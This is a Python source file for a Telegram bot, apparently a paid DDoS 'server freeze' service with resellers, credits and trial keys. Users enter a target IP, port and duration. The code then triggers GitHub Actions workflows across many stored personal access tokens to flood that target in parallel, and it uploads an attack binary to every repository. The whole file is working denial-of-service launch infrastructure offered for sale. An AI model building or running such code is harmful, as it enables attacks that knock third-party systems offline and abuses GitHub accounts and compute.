    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_statistics(query):
    """Show bot statistics"""
    text = f"""
📊 **BOT STATISTICS**

👑 Owners: {len(owners)}
🛡️ Admins: {len(admins)}
💰 Resellers: {len(resellers)}
👥 Approved Users: {len(approved_users)}
🔑 Servers: {len(github_tokens)}

⚙️ **System Status:**
🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}
⏳ Cooldown: {COOLDOWN_DURATION}s
🎯 Max Attacks: {MAX_ATTACKS}

🚀 **Attack Status:**
{"🟢 Active" if current_attack else "🔴 Idle"}
"""
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_my_account(query, user_id):
    """Show user account info"""
    if not is_approved_user(user_id):
        await query.edit_message_text("❌ You don't have an active account.")
        return
    
    user_data = approved_users[str(user_id)]
    expiry = user_data['expiry_date']
    remaining = format_time_remaining(expiry)
    
    text = f"""
📊 **MY ACCOUNT**

👤 Username: @{user_data.get('username', 'Unknown')}
🆔 User ID: `{user_id}`
⏰ Time Left: {remaining}
📅 Expires: {expiry}
👤 Added By: {user_data.get('added_by', 'Unknown')}
📦 Plan: {user_data.get('plan', 'Standard')}
"""
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

logger.info("✅ Part 4: Button handlers loaded")

"""
TELEGRAM BOT - PART 5: ACTION HANDLERS & ATTACK LOGIC
"""

# ==================== ATTACK FUNCTIONS ====================
async def init_attack(query, user_id):
    """Initialize attack process"""
    global current_attack, cooldown_until
    
    if MAINTENANCE_MODE:
        await query.answer("🔧 Maintenance mode is active!", show_alert=True)
        return
    
    if current_attack:
        await query.answer("⚠️ Another attack is already running!", show_alert=True)
        return
    
    if cooldown_until > time.time():
        remaining = int(cooldown_until - time.time())
        await query.answer(f"⏳ Please wait {remaining}s", show_alert=True)
        return
    
    if not github_tokens:
        await query.answer("❌ No servers available!", show_alert=True)
        return
    
    # Set user state for attack flow
    user_states[user_id] = {"state": WAITING_FOR_IP, "data": {}}
    
    # Edit message with instructions
    await query.edit_message_text(
        "🎯 **START ATTACK**\n\n"
        "Please enter the target IP address:",
        reply_markup=get_cancel_keyboard(),
        parse_mode='Markdown'
    )

async def stop_attack_callback(query, user_id):
    """Stop attack via button"""
    global current_attack
    
    if not current_attack:
        await query.answer("⚠️ No active attack to stop!", show_alert=True)
        return
    
    if not (is_owner(user_id) or is_admin(user_id) or current_attack.get('user_id') == user_id):
        await query.answer("❌ You can only stop your own attacks!", show_alert=True)
        return
    
    # Stop the attack
    current_attack = None
    save_attack_state()
    
    await query.edit_message_text(
        "✅ **ATTACK STOPPED**\n\n"
        "The current attack has been terminated.",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )

async def launch_attack(target, port, duration, user_id, username, context):
    """Launch the actual attack"""
    global current_attack, cooldown_until
    
    # Set current attack
    current_attack = {
        "target": target,
        "port": port,
        "time": duration,
        "user": username,
        "user_id": user_id,
        "start_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    save_attack_state()
    
    # Track user attacks
    if user_id not in user_attack_counts:
        user_attack_counts[user_id] = 0
    user_attack_counts[user_id] += 1
    
    # Launch attack on all servers in separate thread
    def run_attack(token_data):
        try:
            g = Github(token_data['token'])
            repo = g.get_repo(token_data['repo'])
            
            # Trigger workflow
            try:
                workflow = repo.get_workflow("main.yml")
                workflow.create_dispatch(
                    ref="main",
                    inputs={
                        "target": target,
                        "port": str(port),
                        "time": str(duration)
                    }
                )
                logger.info(f"Attack launched on {token_data['username']}")
            except Exception as e:
                logger.error(f"Workflow dispatch error on {token_data['username']}: {e}")
        except Exception as e:
            logger.error(f"Attack error on {token_data['username']}: {e}")
    
    # Launch in parallel threads
    threads = []
    for token_data in github_tokens:
        thread = threading.Thread(target=run_attack, args=(token_data,))
        threads.append(thread)
        thread.start()
    
    # Wait for all threads to complete
    for thread in threads:
        thread.join()
    
    # Set cooldown
    cooldown_until = time.time() + COOLDOWN_DURATION
    save_attack_state()
    
    # Schedule auto-stop after duration
    import asyncio
    await asyncio.sleep(duration)
    
    # Clear attack after duration
    if current_attack and current_attack.get('user_id') == user_id:
        current_attack = None
        save_attack_state()

# ==================== USER MANAGEMENT ACTIONS ====================
async def init_add_user(query, user_id):
    """Initialize add user process"""
    user_states[user_id] = {"state": WAITING_FOR_USER_ID, "action": "add", "data": {}}
    
    await query.edit_message_text(
        "➕ **ADD USER**\n\n"
        "Please enter the User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def init_remove_user(query, user_id):
    """Initialize remove user process"""
    user_states[user_id] = {"state": WAITING_FOR_REMOVE_ID, "action": "remove"}
    
    await query.edit_message_text(
        "➖ **REMOVE USER**\n\n"
        "Please enter the User ID to remove:",
        reply_markup=get_cancel_keyboard()
    )

async def show_pending_users(query):
    """Show pending access requests"""
    pending = load_pending_users()
    
    if not pending:
        text = "📭 No pending requests."
    else:
        text = "📝 **PENDING REQUESTS**\n\n"
        for i, req in enumerate(pending, 1):
            text += f"{i}. @{req.get('username', 'Unknown')}\n"
            text += f"   🆔 ID: {req['user_id']}\n"
            text += f"   📅 {req.get('date', 'N/A')}\n\n"
        
        text += f"\n📊 Total: {len(pending)} requests"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

# ==================== SERVER MANAGEMENT ACTIONS ====================
async def init_add_server(query, user_id):
    """Initialize add server process"""
    user_states[user_id] = {"state": WAITING_FOR_TOKEN}
    
    await query.edit_message_text(
        "➕ **ADD SERVER**\n\n"
        "Please send your GitHub Personal Access Token:",
        reply_markup=get_cancel_keyboard()
    )

async def init_remove_server(query, user_id):
    """Initialize remove server process"""
    if not github_tokens:
        await query.edit_message_text(
            "📭 No servers to remove.",
            reply_markup=get_back_keyboard()
        )
        return
    
    text = "🔑 **SELECT SERVER TO REMOVE**\n\n"
    for i, token_data in enumerate(github_tokens, 1):
        text += f"{i}. {token_data['username']} - {token_data['repo']}\n"
    
    text += "\nReply with the server number:"
    
    user_states[user_id] = {"state": "select_server_remove"}
    
    await query.edit_message_text(text, reply_markup=get_cancel_keyboard())

async def init_upload_binary(query, user_id):
    """Initialize binary upload"""
    if not github_tokens:
        await query.edit_message_text(
            "❌ No servers available!\n\nAdd servers first.",
            reply_markup=get_back_keyboard()
        )
        return
    
    user_states[user_id] = {"state": WAITING_FOR_BINARY}
    
    await query.edit_message_text(
        "📤 **UPLOAD BINARY**\n\n"
        "Please send your binary file.\n"
        f"It will be uploaded as '{BINARY_FILE_NAME}' to all servers.",
        reply_markup=get_cancel_keyboard()
    )

# ==================== SETTINGS ACTIONS ====================
async def init_set_cooldown(query, user_id):
    """Initialize cooldown setting"""
    user_states[user_id] = {"state": WAITING_FOR_COOLDOWN}
    
    await query.edit_message_text(
        f"⏱️ **SET COOLDOWN**\n\n"
        f"Current: {COOLDOWN_DURATION}s\n\n"
        "Enter new cooldown duration (in seconds):",
        reply_markup=get_cancel_keyboard()
    )

async def init_set_max_attacks(query, user_id):
    """Initialize max attacks setting"""
    user_states[user_id] = {"state": WAITING_FOR_MAX_ATTACKS}
    
    await query.edit_message_text(
        f"🎯 **SET MAX ATTACKS**\n\n"
        f"Current: {MAX_ATTACKS}\n\n"
        "Enter new max attacks limit:",
        reply_markup=get_cancel_keyboard()
    )

async def toggle_maintenance(query, user_id):
    """Toggle maintenance mode"""
    global MAINTENANCE_MODE
    
    MAINTENANCE_MODE = not MAINTENANCE_MODE
    save_maintenance_mode(MAINTENANCE_MODE)
    
    status = "ON" if MAINTENANCE_MODE else "OFF"
    
    await query.edit_message_text(
        f"🔧 **MAINTENANCE MODE**\n\n"
        f"Status: **{status}**\n\n"
        f"{'All attacks are now disabled.' if MAINTENANCE_MODE else 'Bot is back online!'}",
        reply_markup=get_back_keyboard(),
        parse_mode='Markdown'
    )

# ==================== BROADCAST ====================
async def start_broadcast(query, user_id):
    """Initialize broadcast"""
    user_states[user_id] = {"state": WAITING_FOR_BROADCAST}
    
    await query.edit_message_text(
        "📢 **BROADCAST MESSAGE**\n\n"
        "Send the message you want to broadcast to all users:",
        reply_markup=get_cancel_keyboard()
    )

# ==================== RESELLER ACTIONS ====================
async def init_reseller_add_user(query, user_id):
    """Reseller add user"""
    reseller_data = resellers[str(user_id)]
    
    if reseller_data.get('credits', 0) <= 0:
        await query.answer("❌ Insufficient credits!", show_alert=True)
        return
    
    user_states[user_id] = {
        "state": WAITING_FOR_RESELLER_ID,
        "action": "reseller_add",
        "data": {}
    }
    
    await query.edit_message_text(
        f"➕ **ADD USER**\n\n"
        f"💳 Your Credits: {reseller_data.get('credits', 0)} days\n\n"
        "Enter User ID:",
        reply_markup=get_cancel_keyboard()
    )

async def show_reseller_users(query, user_id):
    """Show reseller's users"""
    text = "👥 **MY USERS**\n\n"
    
    my_users = [
        (uid, data) for uid, data in approved_users.items()
        if data.get('added_by') == str(user_id)
    ]
    
    if not my_users:
        text += "📭 You haven't added any users yet."
    else:
        for i, (uid, data) in enumerate(my_users, 1):
            username = data.get('username', 'Unknown')
            expiry = data.get('expiry_date')
            remaining = format_time_remaining(expiry)
            text += f"{i}. @{username} (ID: {uid})\n"
            text += f"   ⏰ {remaining}\n\n"
        
        text += f"📊 Total: {len(my_users)} users"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_credits(query, user_id):
    """Show reseller credits"""
    reseller_data = resellers[str(user_id)]
    credits = reseller_data.get('credits', 0)
    
    text = f"""
💳 **YOUR CREDITS**

💰 Available: {credits} days
👥 Users Added: {reseller_data.get('users_added', 0)}
📅 Member Since: {reseller_data.get('added_date', 'N/A')}

💡 Each day of credit = 1 day for a user
"""
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

async def show_reseller_prices(query):
    """Show reseller price list"""
    text = "💰 **RESELLER PRICE LIST**\n\n"
    
    for days, price in RESELLER_PRICES.items():
        text += f"{days} Day{'s' if days != '1' else ''}: ₹{price}\n"
    
    text += "\n💡 Contact owner to purchase credits"
    
    keyboard = get_back_keyboard()
    await query.edit_message_text(text, reply_markup=keyboard, parse_mode='Markdown')

# ==================== ACCESS REQUEST ====================
async def request_access(query, user_id):
    """Request access to bot"""
    pending = load_pending_users()
    
    # Check if already requested
    for req in pending:
        if req['user_id'] == user_id:
            await query.answer("⚠️ You already have a pending request!", show_alert=True)
            return
    
    # Check if already has access
    if has_access(user_id):
        await query.answer("✅ You already have access!", show_alert=True)
        return
    
    # Add to pending
    pending.append({
        "user_id": user_id,
        "username": query.from_user.username or f"user_{user_id}",
        "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })
    save_pending_users(pending)
    
    await query.edit_message_text(
        "✅ **ACCESS REQUESTED**\n\n"
        "Your request has been submitted.\n"
        "Please wait for admin approval.",
        reply_markup=get_back_keyboard()
    )

async def init_redeem_key(query, user_id):
    """Initialize key redemption"""
    user_states[user_id] = {"state": WAITING_FOR_REDEEM_KEY}
    
    await query.edit_message_text(
        "🎁 **REDEEM KEY**\n\n"
        "Enter your trial key:",
        reply_markup=get_cancel_keyboard()
    )

logger.info("✅ Part 5: Action handlers loaded")

"""
TELEGRAM BOT - PART 6: MESSAGE HANDLERS & MAIN FUNCTION
"""

import asyncio

# ==================== TEXT MESSAGE HANDLER ====================
async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text messages based on user state"""
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
    if user_id not in user_states or user_states[user_id] is None:
        return
    
    state_info = user_states[user_id]
    state = state_info.get("state")
    
    # Attack flow
    if state == WAITING_FOR_IP:
        state_info["data"]["target"] = text
        state_info["state"] = WAITING_FOR_PORT
        await update.message.reply_text(
            "🔌 **Target IP saved!**\n\n"
            "Now enter the PORT:",
            reply_markup=get_cancel_keyboard()
        )
    
    elif state == WAITING_FOR_PORT:
        try:
            port = int(text)
            if port < 1 or port > 65535:
                await update.message.reply_text(
                    "⚠️ Invalid port! Must be 1-65535.\n\nEnter PORT:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            state_info["data"]["port"] = port
            state_info["state"] = WAITING_FOR_TIME
            await update.message.reply_text(
                "⏱️ **Port saved!**\n\n"
                "Enter attack DURATION (in seconds):",
                reply_markup=get_cancel_keyboard()
            )
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid port number!\n\nEnter PORT:",
                reply_markup=get_cancel_keyboard()
            )
    
    elif state == WAITING_FOR_TIME:
        try:
            duration = int(text)
            if duration < 10 or duration > 3600:
                await update.message.reply_text(
                    "⚠️ Invalid duration! Must be 10-3600 seconds.\n\nEnter DURATION:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            
            target = state_info["data"]["target"]
            port = state_info["data"]["port"]
            username = update.effective_user.username or f"user_{user_id}"
            
            # Send confirmation message
            await update.message.reply_text(
                f"🚀 **ATTACK LAUNCHED!**\n\n"
                f"🎯 Target: `{target}`\n"
                f"🔌 Port: `{port}`\n"
                f"⏱️ Duration: `{duration}s`\n\n"
                f"⚡ Attack is running on {len(github_tokens)} servers!\n"
                f"⏳ Cooldown will start after completion.",
                reply_markup=get_back_keyboard(),
                parse_mode='Markdown'
            )
            
            # Clear user state before launching
            user_states[user_id] = None
            
            # Launch attack in background
            import asyncio
            asyncio.create_task(launch_attack(target, port, duration, user_id, username, context))
            
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid duration!\n\nEnter DURATION:",
                reply_markup=get_cancel_keyboard()
            )
    
    # Add user flow
    elif state == WAITING_FOR_USER_ID:
        try:
            target_user_id = int(text)
            state_info["data"]["user_id"] = target_user_id
            state_info["state"] = WAITING_FOR_DAYS
            await update.message.reply_text(
                f"✅ User ID: {target_user_id}\n\n"
                "Now enter the number of DAYS:",
                reply_markup=get_cancel_keyboard()
            )
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid User ID!\n\nEnter User ID:",
                reply_markup=get_cancel_keyboard()
            )
    
    elif state == WAITING_FOR_DAYS:
        try:
            days = int(text)
            if days < 1 or days > 365:
                await update.message.reply_text(
                    "⚠️ Invalid! Days must be 1-365.\n\nEnter DAYS:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            
            target_user_id = state_info["data"]["user_id"]
            expiry = datetime.now() + timedelta(days=days)
            
            approved_users[str(target_user_id)] = {
                "username": f"user_{target_user_id}",
                "expiry_date": expiry.strftime("%Y-%m-%d %H:%M:%S"),
                "added_by": str(user_id),
                "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "plan": f"{days} days"
            }
            save_approved_users(approved_users)
            
            await update.message.reply_text(
                f"✅ **USER ADDED!**\n\n"
                f"🆔 User ID: {target_user_id}\n"
                f"⏰ Duration: {days} days\n"
                f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}",
                reply_markup=get_back_keyboard()
            )
            
            # Notify user
            try:
                await context.bot.send_message(
                    chat_id=target_user_id,
                    text=f"✅ You've been granted access for {days} days!\n\nUse /start to begin."
                )
            except:
                pass
            
            user_states[user_id] = None
            
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid number!\n\nEnter DAYS:",
                reply_markup=get_cancel_keyboard()
            )
    
    # Remove user
    elif state == WAITING_FOR_REMOVE_ID:
        try:
            target_user_id = int(text)
            if str(target_user_id) in approved_users:
                del approved_users[str(target_user_id)]
                save_approved_users(approved_users)
                
                await update.message.reply_text(
                    f"✅ **USER REMOVED!**\n\n"
                    f"User ID {target_user_id} has been removed.",
                    reply_markup=get_back_keyboard()
                )
                
                # Notify user
                try:
                    await context.bot.send_message(
                        chat_id=target_user_id,
                        text="⚠️ Your access has been revoked."
                    )
                except:
                    pass
            else:
                await update.message.reply_text(
                    f"❌ User ID {target_user_id} not found.",
                    reply_markup=get_back_keyboard()
                )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid User ID!\n\nEnter User ID:",
                reply_markup=get_cancel_keyboard()
            )
    
    # Add server (GitHub token)
    elif state == WAITING_FOR_TOKEN:
        token = text.strip()
        repo_name = "soulcrack-tg"
        
        try:
            # Check if token already exists
            for existing_token in github_tokens:
                if existing_token['token'] == token:
                    await update.message.reply_text(
                        "❌ This token is already added!",
                        reply_markup=get_back_keyboard()
                    )
                    user_states[user_id] = None
                    return
            
            # Validate and create repo
            g = Github(token)
            user = g.get_user()
            username = user.login
            repo, created = create_repository(token, repo_name)
            
            # Add token
            new_token_data = {
                'token': token,
                'username': username,
                'repo': f"{username}/{repo_name}",
                'added_date': datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                'status': 'active'
            }
            github_tokens.append(new_token_data)
            save_github_tokens(github_tokens)
            
            await update.message.reply_text(
                f"✅ **SERVER ADDED!**\n\n"
                f"👤 Username: {username}\n"
                f"📁 Repo: {repo_name}\n"
                f"📊 Total Servers: {len(github_tokens)}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except Exception as e:
            await update.message.reply_text(
                f"❌ **ERROR**\n\n{str(e)}\n\nPlease check the token.",
                reply_markup=get_cancel_keyboard()
            )
    
    # Broadcast message
    elif state == WAITING_FOR_BROADCAST:
        all_users = set()
        for uid in approved_users.keys():
            all_users.add(int(uid))
        for uid in resellers.keys():
            all_users.add(int(uid))
        for uid in admins.keys():
            all_users.add(int(uid))
        for uid in owners.keys():
            all_users.add(int(uid))
        
        total_users = len(all_users)
        success_count = 0
        
        progress_msg = await update.message.reply_text(
            f"📢 Sending broadcast to {total_users} users..."
        )
        
        for uid in all_users:
            try:
                await context.bot.send_message(
                    chat_id=uid,
                    text=f"📢 **BROADCAST MESSAGE**\n\n{text}",
                    parse_mode='Markdown'
                )
                success_count += 1
                await asyncio.sleep(0.05)
            except:
                pass
        
        await progress_msg.edit_text(
            f"✅ **BROADCAST COMPLETED!**\n\n"
            f"✅ Sent: {success_count}\n"
            f"❌ Failed: {total_users - success_count}\n"
            f"📊 Total: {total_users}",
            reply_markup=get_back_keyboard()
        )
        user_states[user_id] = None
    
    # Set cooldown
    elif state == WAITING_FOR_COOLDOWN:
        try:
            global COOLDOWN_DURATION
            new_cooldown = int(text)
            if new_cooldown < 10:
                await update.message.reply_text(
                    "⚠️ Minimum cooldown is 10 seconds!\n\nEnter COOLDOWN:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            
            COOLDOWN_DURATION = new_cooldown
            save_cooldown(new_cooldown)
            
            await update.message.reply_text(
                f"✅ **COOLDOWN UPDATED!**\n\n"
                f"New cooldown: {COOLDOWN_DURATION}s",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid number!\n\nEnter COOLDOWN:",
                reply_markup=get_cancel_keyboard()
            )
    
    # Set max attacks
    elif state == WAITING_FOR_MAX_ATTACKS:
        try:
            global MAX_ATTACKS
            max_attacks = int(text)
            if max_attacks < 1 or max_attacks > 1000:
                await update.message.reply_text(
                    "⚠️ Must be 1-1000!\n\nEnter MAX ATTACKS:",
                    reply_markup=get_cancel_keyboard()
                )
                return
            
            MAX_ATTACKS = max_attacks
            save_max_attacks(max_attacks)
            
            await update.message.reply_text(
                f"✅ **MAX ATTACKS UPDATED!**\n\n"
                f"New limit: {MAX_ATTACKS}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
        except ValueError:
            await update.message.reply_text(
                "⚠️ Invalid number!\n\nEnter MAX ATTACKS:",
                reply_markup=get_cancel_keyboard()
            )
    
    # Redeem key
    elif state == WAITING_FOR_REDEEM_KEY:
        key = text.upper()
        
        if key not in trial_keys:
            await update.message.reply_text(
                "❌ Invalid trial key!",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            return
        
        key_data = trial_keys[key]
        
        if key_data.get('used'):
            await update.message.reply_text(
                "❌ This key has already been used!",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            return
        
        expiry = datetime.strptime(key_data['expiry'], "%Y-%m-%d %H:%M:%S")
        if datetime.now() > expiry:
            await update.message.reply_text(
                "❌ This key has expired!",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            return
        
        # Add user
        hours = key_data['hours']
        new_expiry = datetime.now() + timedelta(hours=hours)
        
        approved_users[str(user_id)] = {
            "username": update.effective_user.username or f"user_{user_id}",
            "expiry_date": new_expiry.strftime("%Y-%m-%d %H:%M:%S"),
            "added_by": "trial_key",
            "added_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "plan": f"{hours}h trial"
        }
        
        trial_keys[key]['used'] = True
        trial_keys[key]['used_by'] = user_id
        trial_keys[key]['used_date'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        save_approved_users(approved_users)
        save_trial_keys(trial_keys)
        
        await update.message.reply_text(
            f"✅ **TRIAL KEY ACTIVATED!**\n\n"
            f"🎁 Duration: {hours} hours\n"
            f"⏰ Valid Until: {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"You now have access! Use /start to begin.",
            reply_markup=get_back_keyboard()
        )
        user_states[user_id] = None

# ==================== DOCUMENT HANDLER ====================
async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle binary file upload"""
    user_id = update.effective_user.id
    
    if user_id not in user_states or user_states[user_id] is None:
        return
    
    state_info = user_states[user_id]
    state = state_info.get("state")
    
    if state == WAITING_FOR_BINARY:
        if not is_owner(user_id):
            await update.message.reply_text("⚠️ ACCESS DENIED")
            user_states[user_id] = None
            return
        
        progress_msg = await update.message.reply_text("📥 Downloading binary file...")
        
        try:
            file = await update.message.document.get_file()
            file_path = f"temp_binary_{user_id}.bin"
            await file.download_to_drive(file_path)
            
            with open(file_path, 'rb') as f:
                binary_content = f.read()
            
            file_size = len(binary_content)
            
            await progress_msg.edit_text(
                f"📊 Downloaded: {file_size} bytes\n\n"
                f"📤 Uploading to {len(github_tokens)} servers..."
            )
            
            success_count = 0
            results = []
            
            def upload_to_repo(token_data):
                try:
                    g = Github(token_data['token'])
                    repo = g.get_repo(token_data['repo'])
                    
                    try:
                        existing_file = repo.get_contents(BINARY_FILE_NAME)
                        repo.update_file(
                            BINARY_FILE_NAME,
                            "Update binary file",
                            binary_content,
                            existing_file.sha,
                            branch="main"
                        )
                        results.append((token_data['username'], True))
                    except:
                        repo.create_file(
                            BINARY_FILE_NAME,
                            "Upload binary file",
                            binary_content,
                            branch="main"
                        )
                        results.append((token_data['username'], True))
                except Exception as e:
                    results.append((token_data['username'], False))
            
            threads = []
            for token_data in github_tokens:
                thread = threading.Thread(target=upload_to_repo, args=(token_data,))
                threads.append(thread)
                thread.start()
            
            for thread in threads:
                thread.join()
            
            for username, success in results:
                if success:
                    success_count += 1
            
            os.remove(file_path)
            
            await progress_msg.edit_text(
                f"✅ **UPLOAD COMPLETED!**\n\n"
                f"✅ Successful: {success_count}\n"
                f"❌ Failed: {len(github_tokens) - success_count}\n"
                f"📊 Total: {len(github_tokens)}\n\n"
                f"📁 File: {BINARY_FILE_NAME}\n"
                f"📦 Size: {file_size} bytes",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None
            
        except Exception as e:
            await progress_msg.edit_text(
                f"❌ **ERROR**\n\n{str(e)}",
                reply_markup=get_back_keyboard()
            )
            user_states[user_id] = None

# ==================== MAIN FUNCTION ====================
def main():
    """Main function to start the bot"""
    application = Application.builder().token(BOT_TOKEN).build()
    
    # Command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("id", id_command))
    application.add_handler(CommandHandler("myaccess", myaccess_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("stop", stop_command))
    application.add_handler(CommandHandler("redeem", redeem_command))
    
    # Callback query handler (buttons)
    application.add_handler(CallbackQueryHandler(button_handler))
    
    # Message handlers
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text_message))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    # Print startup info
    print("=" * 50)
    print("🤖 SERVER FREEZE BOT STARTED")
    print("=" * 50)
    print(f"👑 Owners: {len(owners)}")
    print(f"🛡️ Admins: {len(admins)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"👥 Users: {len(approved_users)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max Attacks: {MAX_ATTACKS}")
    print("=" * 50)
    
    application.run_polling()

if __name__ == '__main__':
    main()

logger.info("✅ Part 6: Message handlers and main function loaded")
